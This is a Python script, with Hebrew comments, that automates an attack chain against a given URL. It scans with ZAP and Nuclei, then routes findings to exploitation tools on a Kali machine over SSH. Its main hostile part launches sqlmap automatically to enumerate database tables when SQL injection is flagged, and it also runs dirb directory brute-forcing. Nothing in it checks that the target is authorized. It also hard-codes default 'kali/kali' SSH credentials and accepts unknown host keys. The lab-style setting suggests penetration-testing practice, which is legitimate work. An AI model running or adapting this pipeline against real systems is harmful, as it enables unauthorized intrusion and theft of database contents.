import argparse
import os
import time
from pathlib import Path
from urllib.parse import urlparse

from dotenv import load_dotenv
import paramiko
import threading
import json
import re

try:
  from zapv2 import ZAPv2
except ImportError as exc:
  raise SystemExit("Missing dependency 'zaproxy'. Install the packages in requirements.txt first.") from exc


DEFAULT_ZAP_PROXY = "http://192.168.190.129:8081"
DEFAULT_POLL_INTERVAL = 2
SQL_INJECTION_NAME = "sql injection"


def parse_args() -> argparse.Namespace:
  parser = argparse.ArgumentParser(
    description="Run a ZAP spider scan followed by an active scan against a target URL.",
  )
  parser.add_argument("target_url", help="Target URL to scan, for example http://localhost:3000")
  parser.add_argument(
    "--poll-interval",
    type=int,
    default=DEFAULT_POLL_INTERVAL,
    help="Seconds to wait between scan progress checks.",
  )
  return parser.parse_args()


def load_settings() -> tuple[str, str]:
  env_path = Path(__file__).with_name(".env")
  load_dotenv(env_path)

  api_key = os.getenv("ZAP_API_KEY", "").strip()
  kali_ip = os.getenv("KALI_IP", "").strip() or "the configured Kali machine"
  return api_key, kali_ip


def validate_target_url(target_url: str) -> str:
  parsed = urlparse(target_url)
  if parsed.scheme not in {"http", "https"} or not parsed.netloc:
    raise ValueError("Target URL must include http:// or https:// and a valid host.")
  return target_url.rstrip("/")


def create_zap_client(api_key: str) -> ZAPv2:
  return ZAPv2(
    apikey=api_key,
    proxies={
      "http": DEFAULT_ZAP_PROXY,
      "https": DEFAULT_ZAP_PROXY,
    },
  )


def wait_for_completion(label: str, status_getter, scan_id: str, poll_interval: int) -> None:
  last_status = None

  while True:
    status = int(status_getter(scan_id))
    if status != last_status:
      print(f"[*] {label} progress: {status}%")
      last_status = status

    if status >= 100:
      print(f"[+] {label} completed.")
      return

    time.sleep(poll_interval)


def wait_for_ajax_spider(zap: ZAPv2, poll_interval: int) -> None:
  last_status = None
  saw_running = False

  time.sleep(poll_interval)

  while True:
    status = str(zap.ajaxSpider.status).strip().lower()
    if status != last_status:
      print(f"[*] AJAX Spider status: {status}")
      last_status = status

    if status == "running":
      saw_running = True
    elif saw_running or status == "stopped":
      print("[+] AJAX Spider completed.")
      return

    time.sleep(poll_interval)


def fetch_all_alerts(zap: ZAPv2) -> list[dict]:
  alerts = []
  start = 0
  count = 500

  while True:
    batch = zap.core.alerts(start=start, count=count)
    alerts.extend(batch)

    if len(batch) < count:
      return alerts

    start += count


def is_sql_injection(alert: dict) -> bool:
  return SQL_INJECTION_NAME in alert.get("alert", "").strip().lower()


def print_alerts(alerts: list[dict]) -> None:
  if not alerts:
    print("[*] No alerts were found.")
    return

  print(f"\n[!] Alerts found: {len(alerts)}")
  for index, alert in enumerate(alerts, start=1):
    print("=" * 80)
    print(f"[ALERT {index}] {alert.get('alert', 'Unknown alert')}")
    print(f"URL: {alert.get('url', 'N/A')}")
    print(f"Risk: {alert.get('risk', 'N/A')}")

    param = alert.get("param", "").strip()
    if param:
      print(f"Parameter: {param}")

    evidence = alert.get("evidence", "").strip()
    if evidence:
      print(f"Evidence: {evidence}")

    description = alert.get("description", "").strip()
    if description:
      print(f"Description: {description}")
  print("=" * 80)


def announce_sqlmap_placeholder(kali_ip: str) -> None:
  print(f"[!] SQL Injection detected. Triggering sqlmap placeholder for Kali machine: {kali_ip}")
  if os.name == "nt":
    os.system(f"echo SQL Injection detected. Would now launch sqlmap on the Kali machine {kali_ip}.")
    return

  os.system(f'echo "SQL Injection detected. Would now launch sqlmap on the Kali machine {kali_ip}."')

def run_remote_sqlmap(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating automated SQLMap attack on raw URL: {target_url}")
    
    # === ניקוי ה-URL והוספת לייזר (Asterisk) ===
    # הפעם נחליף את q=1 ב-q=1* # הכוכבית אומרת ל-SQLMap: אל תעשה בדיקות רקע, פשוט תזריק את הקוד הזדוני בדיוק כאן!
    clean_url = re.sub(r'q=.*', 'q=1*', target_url)
    print(f"[*] Sanitized and targeted URL for SQLMap: {clean_url}")
    
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        # בניית פקודת התקיפה:
        # 1. הורדנו את --smart
        # 2. --technique=BEU - מיקוד בשיטות פריצה שמתאימות לאפליקציות מודרניות
        sqlmap_cmd = f"sqlmap -u \"{clean_url}\" --batch --tables --dbms=sqlite --technique=BEU --level=2 --risk=2 --random-agent --flush-session"
        print(f"[*] Executing payload: {sqlmap_cmd}")
        
        stdin, stdout, stderr = ssh.exec_command(sqlmap_cmd)
        
        output = stdout.read().decode('utf-8')
        
        print("\n=== SQLMAP OUTPUT ===")
        print(output)
        print("=====================\n")
            
    except Exception as e:
        print(f"[-] Automated attack failed: {e}")
    finally:
        ssh.close()

def run_remote_dirb(target_url: str, kali_ip: str) -> None:
    print(f"\n[*] Launching Dirb for directory discovery on: {target_url}")
    
    # משיכת פרטי ההתחברות מה-.env
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        # בניית הפקודה - Dirb סורק את כתובת הבסיס שמצאנו
        dirb_cmd = f"dirb {target_url}" 
        print(f"[*] Executing payload: {dirb_cmd}")
        
        # הרצה
        stdin, stdout, stderr = ssh.exec_command(dirb_cmd)
        output = stdout.read().decode('utf-8')
        
        print("\n=== DIRB OUTPUT ===")
        print(output)
        print("=====================\n")
            
    except Exception as e:
        print(f"[-] Directory discovery failed: {e}")
    finally:
        ssh.close()

def run_remote_nuclei(target_url: str, kali_ip: str, results_list: list) -> None:
    print(f"\n[*] Launching Nuclei vulnerability scanner on: {target_url}")
    
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        # הפקודה הממוקדת שלנו
        nuclei_cmd = f"nuclei -u {target_url} -tags cve,vuln,exposure,misconfig,panel -severity critical,high,medium -rl 50 -c 10 -jsonl"
        print(f"[*] Executing payload: {nuclei_cmd}")
        
        stdin, stdout, stderr = ssh.exec_command(nuclei_cmd)
        
        error_output = stderr.read().decode('utf-8')
        if error_output:
            print(f"\n[-] Nuclei System Logs/Errors:\n{error_output}\n")

        for line in stdout:
            try:
                data = json.loads(line.strip())
                finding = {
                    "alert": data.get("info", {}).get("name", "Nuclei Finding"),
                    "url": data.get("matched-at", target_url),
                    "risk": data.get("info", {}).get("severity", "Unknown").capitalize(),
                    "source": "Nuclei"
                }
                results_list.append(finding)
            except json.JSONDecodeError:
                continue 
                
        print(f"[+] Nuclei scan completed. Found {len(results_list)} issues.")
            
    except Exception as e:
        print(f"[-] Nuclei scan failed: {e}")
    finally:
        ssh.close()

EXPLOIT_ROUTER = {
    "sql injection": run_remote_sqlmap,
    # "default credentials": run_remote_hydra,  
    # "cross site scripting": run_remote_xss_tool 
}

def main() -> int:
  args = parse_args()

  try:
    target_url = validate_target_url(args.target_url)
  except ValueError as exc:
    print(f"[-] {exc}")
    return 1

  api_key, kali_ip = load_settings()
  if not api_key:
    print("[-] Missing ZAP_API_KEY in security-tool/.env.")
    return 1

  try:
    # === שלב 1: סריקות במקביל (ZAP + Nuclei) ===
    print("\n[*] [PHASE 1] Starting parallel scans (ZAP and Nuclei)...")
    
    # ניצור רשימה ריקה שתתמלא מתוך ה-Thread של Nuclei
    nuclei_alerts = []
    
    # משגרים את Nuclei שיעבוד ברקע על ה-Kali במקביל
    nuclei_thread = threading.Thread(target=run_remote_nuclei, args=(target_url, kali_ip, nuclei_alerts))
    nuclei_thread.start()

    # בינתיים, התוכנית הראשית שלנו מריצה את ZAP
    print(f"[*] Connecting to ZAP at {DEFAULT_ZAP_PROXY}")
    zap = create_zap_client(api_key)
    print(f"[+] Connected to ZAP version {zap.core.version}")

    print(f"[*] Opening target in ZAP: {target_url}")
    zap.urlopen(target_url)

    print("[*] Starting AJAX spider scan...")
    zap.ajaxSpider.scan(url=target_url)
    wait_for_ajax_spider(zap, args.poll_interval)

    print("[*] Waiting 5 seconds for passive scanning to settle...")
    time.sleep(5)

    print("[*] Starting active scan...")
    active_scan_id = zap.ascan.scan(target_url)
    wait_for_completion("Active Scan", zap.ascan.status, active_scan_id, args.poll_interval)

    zap_alerts = fetch_all_alerts(zap)
    print(f"[*] Retrieved {len(zap_alerts)} alerts from ZAP.")
    print_alerts(zap_alerts)

    # ZAP סיים. עכשיו אנחנו מוודאים שגם Nuclei סיים לפני שממשיכים
    print("\n[*] Waiting for Nuclei background scan to complete...")
    nuclei_thread.join() 
    print("[+] Phase 1 Complete. All scanners finished.")

    # === שלב 2: איחוד הנתונים (Data Normalization) ===
    print("\n[*] [PHASE 2] Merging findings from all scanners...")
    # עכשיו אנחנו באמת מאחדים את שני מקורות המודיעין ל"בריכה" אחת!
    all_findings = zap_alerts.copy() 
    all_findings.extend(nuclei_alerts)
    print(f"[*] Total vulnerabilities aggregated for routing: {len(all_findings)}")

    # === שלב 3: הנתב - תקיפה ממוקדת (Exploitation) ===
    print("\n[*] [PHASE 3] Routing alerts to exploit tools...")
    
    launched_tools = set()
    active_attack_threads = []
    
    # הפעלת ברירת מחדל: Dirb לטובת גילוי נתיבים (כי ZAP לא תמיד רואה ספריות נסתרות)
    if "run_remote_dirb" not in launched_tools:
        print("[*] Triggering default reconnaissance: run_remote_dirb")
        dirb_thread = threading.Thread(target=run_remote_dirb, args=(target_url, kali_ip))
        active_attack_threads.append(dirb_thread)
        dirb_thread.start()
        launched_tools.add("run_remote_dirb")

    # ניתוב חכם לפי ממצאים למילון הכלים (EXPLOIT_ROUTER)
    for finding in all_findings:
        alert_name = finding.get('alert', '').lower()
        url = finding.get('url', '')
        
        for vulnerability_keyword, attack_function in EXPLOIT_ROUTER.items():
            if vulnerability_keyword in alert_name and attack_function.__name__ not in launched_tools:
                print(f"[*] Match! Routing '{vulnerability_keyword}' to {attack_function.__name__}")
                
                t = threading.Thread(target=attack_function, args=(url, kali_ip))
                active_attack_threads.append(t)
                t.start()
                
                launched_tools.add(attack_function.__name__)
                
    # המתנה לסיום כל כלי התקיפה והמודיעין
    if active_attack_threads:
        print(f"[*] Waiting for {len(active_attack_threads)} attack/recon tools to finish...")
        for t in active_attack_threads:
            t.join()

    print("\n[+] All automated attacks have completed successfully!")

  except KeyboardInterrupt:
    print("\n[-] Scan interrupted by user.")
    return 130
  except Exception as exc:
    print(f"[-] Scan failed: {exc}")
    return 1

  return 0


if __name__ == "__main__":
  raise SystemExit(main())
